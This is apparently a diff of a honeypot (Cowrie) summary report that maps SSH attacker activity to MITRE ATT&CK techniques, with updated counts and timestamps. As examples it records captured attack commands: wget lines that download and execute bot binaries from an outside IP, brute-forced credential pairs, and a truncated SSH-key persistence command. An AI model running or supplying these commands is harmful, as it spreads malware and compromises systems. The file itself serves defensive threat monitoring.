@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-18 18:01:46",
+  "generated": "2026-08-18 19:02:07",
   "totals": {
-    "commands": 8466,
-    "login_failed": 5801,
-    "login_success": 2589,
-    "sessions": 5966
+    "commands": 8474,
+    "login_failed": 6530,
+    "login_success": 2595,
+    "sessions": 6705
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 5801,
+      "count": 6530,
       "examples": [
         "root / 19801024",
         "root / sunsunsun",
@@ -21,14 +21,14 @@
         "root / 826826826"
       ],
       "first": "2026-08-18T00:00:03.054815Z",
-      "last": "2026-08-18T18:01:45.378160Z",
-      "unique_ips": 83
+      "last": "2026-08-18T19:02:03.770000Z",
+      "unique_ips": 87
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 2589,
+      "count": 2595,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / 123@@@",
@@ -37,14 +37,14 @@
         "enable\\x00 / system\\x00"
       ],
       "first": "2026-08-18T00:06:39.840434Z",
-      "last": "2026-08-18T17:53:49.218664Z",
-      "unique_ips": 57
+      "last": "2026-08-18T18:39:20.001510Z",
+      "unique_ips": 63
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 226,
+      "count": 227,
       "examples": [
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/pmips; chmod 777 pmips; ./pmips; r",
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/x86_64; chmod 777 x86_64; ./x86_64",
@@ -53,8 +53,8 @@
         "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://31.77.227.121/bins/parm5; chmod 777 parm5; ./parm5; r"
       ],
       "first": "2026-08-18T02:18:51.232788Z",
-      "last": "2026-08-18T17:53:51.379390Z",
-      "unique_ips": 17
+      "last": "2026-08-18T18:22:09.785239Z",
+      "unique_ips": 18
     },
     {
       "id": "T1105",
@@ -76,7 +76,7 @@
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 17,
+      "count": 21,
       "examples": [
         "uname -s -v -n -r -m",
         "/bin/./uname -s -v -n -r -m",
@@ -85,8 +85,8 @@
         "uname -a"
       ],
       "first": "2026-08-18T02:27:39.980641Z",
-      "last": "2026-08-18T17:53:51.379390Z",
-      "unique_ips": 13
+      "last": "2026-08-18T18:39:20.785797Z",
+      "unique_ips": 17
     },
     {
       "id": "T1033",
@@ -153,20 +153,32 @@
       "first": "2026-08-18T11:08:14.467451Z",
       "last": "2026-08-18T11:08:14.467451Z",
       "unique_ips": 1
+    },
+    {
+      "id": "T1098.004",
+      "name": "Account Manipulation: SSH Authorized Keys",
+      "tactic": "Persistence",
+      "count": 1,
+      "examples": [
+        "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chatt"
+      ],
+      "first": "2026-08-18T18:22:09.785239Z",
+      "last": "2026-08-18T18:22:09.785239Z",
+      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
       "system",
-      2525
+      2526
     ],
     [
       "shell",
-      2525
+      2526
     ],
     [
       "sh",
-      2525
+      2526
     ],
     [
       "/bin/busybox",
